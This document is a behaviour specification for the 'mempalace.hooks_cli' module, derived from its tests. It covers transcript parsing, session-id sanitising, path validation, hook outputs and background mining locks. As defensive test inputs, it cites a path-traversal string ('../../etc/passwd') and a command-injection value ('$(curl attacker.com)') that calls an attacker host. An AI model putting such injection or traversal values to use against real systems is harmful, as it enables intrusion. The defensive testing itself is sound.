# Behavior Spec: `mempalace.hooks_cli` (derived from `tests/test_hooks_cli.py`)

This document specifies the observable behavior of the hooks subsystem as exercised
by its test suite. It is a black-box contract: an implementation in any language must
satisfy every claim below. All citations point into `tests/test_hooks_cli.py`.

## Module surface under test

The public surface imported and exercised includes the constant `SAVE_INTERVAL` and the
functions `_count_human_messages`, `_diary_agent_for_harness`, `_extract_recent_messages`,
`_get_mine_targets`, `_hooks_daemon_enabled`, `_log`, `_maybe_auto_ingest`, `_mempalace_python`,
`_mine_already_running`, `_mine_sync`, `_parse_harness_input`, `_sanitize_session_id`,
`_save_diary_direct`, `_validate_transcript_path`, `_wing_from_transcript_path`, `hook_stop`,
`hook_session_start`, `hook_precompact`, `run_hook`, `_claim_mine_slot`, `_pid_file_for_cmd`
(tests/test_hooks_cli.py:L13-L36). Additional internals referenced: `_output`, `_spawn_mine`,
`_ingest_transcript`, `_detached_popen_kwargs`, `_mine_slot_timeout_secs`, `_palace_root_exists`,
`_daemon_available`, and module-level state `PALACE_ROOT`, `STATE_DIR`, `_MINE_PID_DIR`,
`_state_dir_initialized` (tests/test_hooks_cli.py:L65-L68,L1027,L1069,L1175,L1319,L1933).

## State directory model

`PALACE_ROOT` is the palace root (default `~/.mempalace`); `STATE_DIR` is a `hook_state`
subdirectory under it; `_MINE_PID_DIR` is a `mine_pids` subdirectory under `STATE_DIR` and is
derived from `STATE_DIR` at module import time (tests/test_hooks_cli.py:L62-L67). The hook log
file is `STATE_DIR/hook.log` (tests/test_hooks_cli.py:L792-L793).

## `_mempalace_python()`

Returns a non-empty string naming a Python interpreter; the basename contains `python`
case-insensitively (tests/test_hooks_cli.py:L75-L84). It must never raise when the package lives
at a shallow filesystem path with fewer than 4 parent path components; in that case it falls
through to an editable-install path or the running interpreter and still returns a string whose
lowercase form contains `python` (tests/test_hooks_cli.py:L87-L128).

## `_sanitize_session_id(s)`

Returns the input unchanged when it contains only alphanumerics, hyphens, and underscores, e.g.
`"abc-123_XYZ"` -> `"abc-123_XYZ"` (tests/test_hooks_cli.py:L134-L135). Dangerous characters
(slashes, dots) are stripped, so `"../../etc/passwd"` -> `"etcpasswd"`
(tests/test_hooks_cli.py:L138-L139). When the result would be empty (empty input or all-stripped
input such as `"!!!"`), it returns `"unknown"` (tests/test_hooks_cli.py:L142-L144).

## Transcript JSONL format

A transcript is a newline-delimited file where each line is a JSON object. Recognized message
records carry either `{"message": {"role": ..., "content": ...}}` (tests/test_hooks_cli.py:L150-L165)
or top-level fields such as `{"type": ..., "cwd": ..., "content": ...}`
(tests/test_hooks_cli.py:L634-L638). `content` may be a string or a list of content blocks of the
form `{"type": "text", "text": ...}` (tests/test_hooks_cli.py:L186-L205).

## `_count_human_messages(path)` -> int

Counts records whose role is `user` (tests/test_hooks_cli.py:L156-L166). Records whose text is
wrapped in `<command-message>...</command-message>` are excluded from the count
(tests/test_hooks_cli.py:L169-L183), including when `content` is a list of text blocks
(tests/test_hooks_cli.py:L186-L205). Returns `0` for a missing file
(tests/test_hooks_cli.py:L208-L209) and for an empty file (tests/test_hooks_cli.py:L212-L215).
Malformed (non-JSON) lines are skipped without aborting; valid lines after a malformed one are
still counted (tests/test_hooks_cli.py:L218-L221). A path failing validation (e.g. one containing
`..` traversal segments) yields `0` (tests/test_hooks_cli.py:L1790-L1792) and, when the rejected
path is non-empty, emits exactly one log call whose message contains "rejected" (case-insensitive)
(tests/test_hooks_cli.py:L1795-L1801).

## `_extract_recent_messages(path, count=N)` -> list[str]

Returns the last `count` human message texts in chronological order. With 5 messages `msg 0..4`
and `count=3`, returns `["msg 2", "msg 3", "msg 4"]` (tests/test_hooks_cli.py:L227-L236).
Records wrapped in `<command-message>` or `<system-reminder>` tags are skipped, so only genuine
user text is returned (tests/test_hooks_cli.py:L239-L251). Returns an empty list for a missing
file (tests/test_hooks_cli.py:L254-L255).

## `_validate_transcript_path(path)` -> path | None

Returns `None` for an empty string (tests/test_hooks_cli.py:L1785-L1787). Returns `None` for any
path containing `..` traversal segments, including paths that otherwise carry a valid `.jsonl`
suffix such as `"../t.jsonl"`, `"a/../b.jsonl"`, `"/tmp/../etc/t.jsonl"`
(tests/test_hooks_cli.py:L1450-L1460) and traversal targets like `"../../etc/passwd"`
(tests/test_hooks_cli.py:L1757-L1760). Only `.jsonl` and `.json` extensions are accepted; other
extensions (`.txt`, `.py`, or none) yield `None` (tests/test_hooks_cli.py:L1763-L1767). For an
accepted path it returns a path object whose suffix is preserved (`.jsonl` or `.json`)
(tests/test_hooks_cli.py:L1770-L1782) and accepts platform-native path strings including Windows
backslashes (tests/test_hooks_cli.py:L1804-L1813).

## `_wing_from_transcript_path(path)` -> str

Derives a storage "wing" name from a transcript path. The result is always lowercased and prefixed
with `wing_`.

Primary path — cwd from JSONL: if the transcript file records a `cwd` field on any record, the leaf
segment of the first such `cwd` becomes the wing, with hyphens normalized to underscores. The first
record that has a string `cwd` wins; records lacking `cwd` (e.g. `queue-operation` records) are
skipped (tests/test_hooks_cli.py:L625-L670). This cwd value overrides what the encoded folder name
would have produced (tests/test_hooks_cli.py:L625-L639). A `cwd` that is not a string (null, number)
is skipped (tests/test_hooks_cli.py:L710-L721). Malformed JSON lines do not crash extraction; a later
valid `cwd` line is honored (tests/test_hooks_cli.py:L690-L701). A missing transcript file falls back
cleanly to the encoded-folder heuristic (tests/test_hooks_cli.py:L704-L707). When no line records a
`cwd`, it falls through to the encoded-folder heuristic (tests/test_hooks_cli.py:L673-L687).

Encoded-folder heuristic: a Claude Code project directory name of the form
`-<home>-<...>-Projects-<project>` yields `wing_<project>`
(tests/test_hooks_cli.py:L537-L539), with backslash path separators (Windows) also supported
(tests/test_hooks_cli.py:L546-L548) and the result lowercased
(tests/test_hooks_cli.py:L551-L553). A path with no recognizable Claude Code project structure
falls back to `wing_sessions` (tests/test_hooks_cli.py:L542-L543, L686-L687). Hyphenated project
names are preserved (hyphens -> underscores) rather than truncated to the last token: `claude-code`
-> `wing_claude_code`, `react-native` -> `wing_react_native`
(tests/test_hooks_cli.py:L588-L597); sibling projects `customer-portal` and `admin-portal` produce
distinct wings (tests/test_hooks_cli.py:L600-L612); a `projects-` parent directory is stripped while
keeping the full project name (tests/test_hooks_cli.py:L615-L619). For non-`Projects` layouts the
heuristic strips the user-home prefix and one common parent (e.g. `dev-`, `work-`) and keeps the
remaining path joined with underscores: `-home-igor-dev-MemPalace-mempalace` ->
`wing_mempalace_mempalace`; `-Users-alice-code-MyApp` -> `wing_myapp`;
`-home-bob-work-clients-acme-frontend` -> `wing_clients_acme_frontend`
(tests/test_hooks_cli.py:L556-L582).

## `_output(data)` — output channel

Writes a JSON-serialized object to the harness output channel. When `mempalace.mcp_server` is loaded
and exposes a real-stdout file descriptor (`_REAL_STDOUT_FD`), output is written to that descriptor so
it reaches fd 1 even if `sys.stdout` was redirected (tests/test_hooks_cli.py:L727-L752). When
`mcp_server` is not loaded, output is written directly to fd 1
(tests/test_hooks_cli.py:L755-L786). The emitted bytes are valid JSON for the passed object, e.g.
`{"systemMessage": "test"}` round-trips (tests/test_hooks_cli.py:L739-L752) and
`{"continue": true}` round-trips (tests/test_hooks_cli.py:L769-L786).

## `_log(message)` — append to hook log

Appends the message to `STATE_DIR/hook.log`, creating the state directory if the palace root exists;
the file then contains the message text (tests/test_hooks_cli.py:L789-L795). Errors creating the
directory (e.g. an unwritable nonexistent path) are silenced; `_log` never raises
(tests/test_hooks_cli.py:L798-L802).

## Palace-root kill-switch

`_palace_root_exists()` is the source of truth for whether hooks may touch disk. It returns `False`
when `PALACE_ROOT` does not exist and `False` when `PALACE_ROOT` is a regular file (or broken
symlink) rather than a directory (tests/test_hooks_cli.py:L1918-L1933). When the palace root is
absent, `hook_stop`, `hook_precompact`, and `hook_session_start` each short-circuit, write `{}` (or
nothing) to stdout, and must not create the palace directory or any state under it
(tests/test_hooks_cli.py:L1862-L1896). `_log` likewise must not create directories under an absent
or non-directory palace root (tests/test_hooks_cli.py:L1899-L1902, L1941-L1943); a stray regular file
at the palace root is left byte-for-byte untouched (tests/test_hooks_cli.py:L1945-L1947). When the
palace root exists as a directory, hooks proceed normally and `_log` creates the state directory and
log file (tests/test_hooks_cli.py:L1905-L1915).

## Harness routing

`_parse_harness_input(data, harness)` validates and normalizes hook input. An unknown harness name
causes exit with code `1` (tests/test_hooks_cli.py:L1472-L1476). For a known harness it returns a
dict preserving `session_id` and a boolean `stop_hook_active`
(tests/test_hooks_cli.py:L1479-L1489).

`_diary_agent_for_harness(harness)` maps a harness to the diary agent identity that `diary_read`
queries with: `claude-code` -> `claude`, `codex` -> `codex`
(tests/test_hooks_cli.py:L396-L398). An unknown harness falls back to its own name (e.g. `cursor` ->
`cursor`); it must never return the legacy identity `"session-hook"` for any harness
(tests/test_hooks_cli.py:L401-L406).

## `hook_stop(data, harness)` — Stop hook

Output is a JSON object on stdout. The session is configured with `hook_silent_save=true` and
`hook_desktop_toast=false` for the default-mode behavior described below
(tests/test_hooks_cli.py:L276-L279).

Pass-through (emits `{}`) cases:
- `stop_hook_active` is truthy, whether boolean `true` or the string `"true"`
  (tests/test_hooks_cli.py:L287-L304).
- The transcript's human message count is below `SAVE_INTERVAL`
  (tests/test_hooks_cli.py:L307-L322).
- The session already saved at the current message count (a save point recorded earlier), so a repeat
  call with the same count passes through and does not re-invoke the save
  (tests/test_hooks_cli.py:L368-L390).
- `hooks_auto_save` config is false (tests/test_hooks_cli.py:L1664-L1682).

Save case: when the human message count reaches `SAVE_INTERVAL` (and the session is not already
saved, auto_save is on), the hook calls `_save_diary_direct(transcript, session_id, wing=..., toast=False, agent_name=...)`
exactly once and emits a `systemMessage` notification. The message begins with the U+2726 star and a
count, e.g. `"✦ 15 memories woven into the palace"`, and includes the saved themes
(tests/test_hooks_cli.py:L325-L344, L1685-L1708). It does not emit a block decision.

Wing derivation for the save: the wing passed to `_save_diary_direct` is computed from the transcript
path via `_wing_from_transcript_path`; with no `-Projects-` segment it is `wing_sessions`
(tests/test_hooks_cli.py:L342-L344), and a Claude Code project path yields the derived project wing,
e.g. `wing_myproject` (tests/test_hooks_cli.py:L347-L365).

Agent identity for the save: `agent_name` passed to `_save_diary_direct` is the harness-mapped diary
agent, not the legacy `"session-hook"`: `claude-code` -> `claude`, `codex` -> `codex`
(tests/test_hooks_cli.py:L409-L434).

`stop_hook_active` is treated strictly: a non-boolean injection string such as
`"$(curl attacker.com)"` is not treated as truthy, so the save path still runs
(tests/test_hooks_cli.py:L1816-L1842).

Save-point persistence is resilient: if the recorded last-save file contains invalid content, the
hook treats the prior save count as 0 and still produces the `systemMessage`
(tests/test_hooks_cli.py:L1495-L1512). If writing the last-save file raises an OS error, the hook
still emits the `systemMessage` correctly (tests/test_hooks_cli.py:L1515-L1539).

## `hook_session_start(data, harness)` — SessionStart hook

Always passes through, emitting `{}` (tests/test_hooks_cli.py:L513-L519).

## `hook_precompact(data, harness)` — PreCompact hook

Emits `{}` to allow compaction (tests/test_hooks_cli.py:L525-L531). When `hooks_auto_save` is false
it passes through without mining (tests/test_hooks_cli.py:L1711-L1720). When enabled it runs a
synchronous mine via `_mine_sync` then returns `{}` (tests/test_hooks_cli.py:L1723-L1734). When
`MEMPAL_DIR` is set it invokes a synchronous subprocess (`subprocess.run`) exactly once and returns
`{}` (tests/test_hooks_cli.py:L1545-L1557). OS errors and subprocess timeouts from that mine are
handled gracefully and the hook still returns `{}`
(tests/test_hooks_cli.py:L1560-L1586). With no `MEMPAL_DIR`, the precompact path mines the active
transcript's parent directory in the background via `_ingest_transcript` (a `subprocess.Popen`, not
`subprocess.run`), with `--mode convos` and `--wing sessions`
(tests/test_hooks_cli.py:L1589-L1616).

## `run_hook(name, harness)` — dispatcher

Reads a JSON object from stdin and dispatches to the matching handler, then emits the handler's output
via `_output`. `session-start`, `stop`, and `precompact` each dispatch and (in the tested cases)
output `{}` (tests/test_hooks_cli.py:L1622-L1658). An unknown hook name causes exit with code `1`
(tests/test_hooks_cli.py:L1737-L1742). Invalid stdin JSON does not crash; it is treated as an empty
input object and the handler still emits its output (tests/test_hooks_cli.py:L1745-L1751).

## `_save_diary_direct(transcript, session_id, wing=, agent_name=, toast=)`

Returns a dict including a `count` of saved entries (tests/test_hooks_cli.py:L460,L493). The end-to-end
contract: an entry written by this path is discoverable via `diary_read(agent_name="claude")` (it
contributes to `total >= 1` and the entry content contains `"CHECKPOINT"`), and is NOT discoverable
under the legacy `agent_name="session-hook"` identity (whose entries remain empty)
(tests/test_hooks_cli.py:L437-L468).

Daemon opt-in: when `MEMPALACE_HOOKS_DAEMON` is set to a truthy value (e.g. `"yes"`),
`MEMPALACE_PALACE_PATH` is set, and a daemon is available, the save submits a background job rather
than writing inline. It calls `submit_job("diary_write", payload)` exactly once where the payload has
`agent_name`, `wing`, and `topic == "checkpoint"`; the returned `count` reflects the message count
(here 3); and a `last_checkpoint` marker file is created under `STATE_DIR`
(tests/test_hooks_cli.py:L471-L500).

## `_hooks_daemon_enabled()` -> bool

Returns `False` by default; returns `True` only when config `hook_use_daemon` is explicitly true
(tests/test_hooks_cli.py:L503-L507).

## `_maybe_auto_ingest()` — background project mining

With neither `MEMPAL_DIR` nor a transcript in the environment, it does nothing and never raises
(tests/test_hooks_cli.py:L808-L812). With `MEMPAL_DIR` set, it spawns a single background mine
(`subprocess.Popen`) whose command contains `mine`, the resolved `MEMPAL_DIR` path, and
`--mode projects` (tests/test_hooks_cli.py:L815-L828). The interpreter used as `argv[0]` is the value
of `_mempalace_python()`, not a bare system interpreter (tests/test_hooks_cli.py:L858-L877). It never
mines the transcript directory itself — that is owned by `_ingest_transcript`
(tests/test_hooks_cli.py:L942-L959). OS errors during spawn are silenced
(tests/test_hooks_cli.py:L980-L988). If a mine for the same target is already running (a live PID slot
exists), it does not spawn a new one (tests/test_hooks_cli.py:L991-L1019).

Daemon opt-in: when daemon hooks are enabled and a daemon is available, it submits a background mine
job instead of spawning a subprocess — it does not call `Popen`, calls
`submit_job("mine", {...}, wait=False)` exactly once with `source` equal to the resolved `MEMPAL_DIR`
(tests/test_hooks_cli.py:L831-L855).

## `_get_mine_targets()` -> list[(path, mode)]

With `MEMPAL_DIR` set, returns exactly one target: the expanded/resolved directory paired with mode
`"projects"`; a `~`-prefixed `MEMPAL_DIR` is expanded against home
(tests/test_hooks_cli.py:L1398-L1423, L1440-L1447). It never emits a `convos` target for the
transcript path (tests/test_hooks_cli.py:L1426-L1437). Returns an empty list when `MEMPAL_DIR` is
unset or invalid (tests/test_hooks_cli.py:L1463-L1466).

## `_mine_sync()` — synchronous precompact mine

When `MEMPAL_DIR` is set, runs a single synchronous `subprocess.run` whose command includes
`--mode projects` (tests/test_hooks_cli.py:L880-L890), using `_mempalace_python()` as `argv[0]`
(tests/test_hooks_cli.py:L893-L903). It does not run a convos mine for the transcript directory
(tests/test_hooks_cli.py:L962-L977).

## Mine PID-slot protocol (`_pid_file_for_cmd`, `_claim_mine_slot`, `_mine_already_running`, `_spawn_mine`)

Each mine command maps deterministically to a per-target slot file under `_MINE_PID_DIR` via
`_pid_file_for_cmd(cmd)`; distinct commands map to distinct slots
(tests/test_hooks_cli.py:L911-L914, L1381-L1392). The slot file content format is
`"{pid} {unix_timestamp}"`; the first whitespace-delimited token is the owning PID
(tests/test_hooks_cli.py:L915-L917, L938-L939, L1129-L1131).

`_claim_mine_slot(cmd)`: writes a live placeholder slot (current process PID plus timestamp) and
returns the slot path; a second claim for an already-claimed live slot returns `None`
(tests/test_hooks_cli.py:L906-L919). A stale slot pointing at a dead PID is reclaimed: the function
overwrites it with a live placeholder and returns the slot path
(tests/test_hooks_cli.py:L922-L939).

`_mine_already_running(cmd)` -> bool:
- `False` when no slot file exists (tests/test_hooks_cli.py:L1255-L1259).
- `False` when the recorded PID is not alive (tests/test_hooks_cli.py:L1262-L1268).
- `True` when the recorded PID is alive and within the configured timeout, in the new
  `"{pid} {ts}"` format (tests/test_hooks_cli.py:L1271-L1280).
- For the legacy bare-PID format, liveness is checked and the file mtime is used for the
  stale-by-age check: a fresh bare-PID slot for a live PID is `True`
  (tests/test_hooks_cli.py:L1283-L1289), but once the file mtime exceeds the timeout the slot is
  stale and the result is `False` (tests/test_hooks_cli.py:L1292-L1305).
- A malformed timestamp fails soft to `False` rather than crashing
  (tests/test_hooks_cli.py:L1308-L1314).
- A live PID whose timestamp has exceeded the configured timeout returns `False`
  (tests/test_hooks_cli.py:L1325-L1338); within the timeout returns `True`
  (tests/test_hooks_cli.py:L1341-L1353).
- Timeout of `0` disables the age check entirely, so even a 24h-old slot with a live PID returns
  `True` (tests/test_hooks_cli.py:L1356-L1369).
- Non-integer slot content returns `False` (tests/test_hooks_cli.py:L1372-L1378).
- Slots are independent per command: a live slot for command A does not affect command B
  (tests/test_hooks_cli.py:L1381-L1392).

Timeout configuration: `MEMPALACE_MINE_TIMEOUT_HOURS` controls the staleness timeout. An invalid
value disables the timeout — `_mine_slot_timeout_secs()` returns `0.0`
(tests/test_hooks_cli.py:L1317-L1322).

`_spawn_mine(cmd)`: forwards detached process kwargs so the parent hook can exit cleanly — at minimum
`stdin=DEVNULL` and `close_fds=True` (tests/test_hooks_cli.py:L1063-L1076). It skips spawning when a
live, fresh slot for the same target exists (tests/test_hooks_cli.py:L1079-L1095); distinct targets do
not block each other and both spawn (tests/test_hooks_cli.py:L1098-L1110). It reclaims a slot pointing
at a dead PID and records the new child PID in the slot
(tests/test_hooks_cli.py:L1113-L1131). If spawning raises an OS error, the claimed slot is released
(deleted) so the next hook fire is not permanently blocked, and the OS error propagates
(tests/test_hooks_cli.py:L1134-L1149). The child process inherits `MEMPALACE_MINE_PID_FILE` set to the
slot path so its own cleanup can find and clear the slot (tests/test_hooks_cli.py:L1152-L1165).

## `_detached_popen_kwargs()` — platform-specific child detachment

On POSIX: returns `start_new_session=True`, `stdin=DEVNULL`, `close_fds=True`, and no `creationflags`
(tests/test_hooks_cli.py:L1025-L1034). On Windows: returns `stdin=DEVNULL`, `close_fds=True`, and
`creationflags` with both the detached-process flag (`0x00000008`) and the new-process-group flag
(`0x00000200`) set (tests/test_hooks_cli.py:L1037-L1060).

## `_ingest_transcript(path)` — transcript convos mining

Files below 100 bytes are skipped (the gate); larger files (>100 bytes) proceed
(tests/test_hooks_cli.py:L1170-L1171, L1599-L1600). It spawns a background mine via `Popen` with
detached kwargs (`stdin=DEVNULL`, `close_fds=True`) (tests/test_hooks_cli.py:L1168-L1181). The mine
command targets the transcript's parent directory with `--mode convos --wing sessions`
(tests/test_hooks_cli.py:L1219-L1238, L1613-L1616). Repeated ingests for the same transcript while the
mine is running are deduplicated — no second spawn (tests/test_hooks_cli.py:L1209-L1238).

Daemon opt-in: when daemon hooks are enabled and a daemon is available, it submits a job instead of
spawning. It does not call `Popen`; it calls `submit_job` once with a payload whose `source` is the
transcript's parent directory, `mode == "convos"`, and `wing == "sessions"`
(tests/test_hooks_cli.py:L1184-L1206).
